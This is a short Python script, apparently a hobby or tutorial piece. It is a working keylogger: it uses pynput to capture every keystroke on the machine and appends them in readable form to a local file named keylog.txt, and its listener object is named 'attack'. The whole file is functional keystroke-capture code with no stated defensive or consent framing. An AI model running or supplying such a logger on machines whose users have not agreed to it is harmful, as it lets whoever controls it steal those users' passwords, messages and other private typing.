from pynput.keyboard import Listener
def writetofile(key):
    letter = str(key)
    letter = letter.replace("'", "")
    if letter == 'Key.space':
        letter = ' '
    if letter == 'Key.shift_r':
        letter = ''
    if letter == "Key.ctrl_l":
        letter = ""
    if letter == "Key.enter":
        letter = "\n"

    with open("keylog.txt", 'a') as f:
        f.write(letter)
with Listener(on_press=writetofile) as attack:
    attack.join()